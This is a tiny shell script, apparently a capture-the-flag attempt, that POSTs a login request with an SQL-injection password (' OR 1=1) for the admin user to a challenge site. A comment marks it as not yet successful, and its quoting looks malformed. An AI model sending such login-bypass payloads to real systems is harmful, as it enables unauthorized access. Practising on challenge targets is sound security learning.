#!/usr/bin/env sh
# -*- coding: utf-8 -*-

# http://mongoose.apjctf.com/
# https://github.com/lcrowther-snyk/mongoose/tree/main

# TODO: Not found yet
curl -H "Content-Type: application/json" --request POST \
--data '{"username": "admin", "password": "idontknow'\'' OR 1=1'\" \
 http://mongoose.apjctf.com/
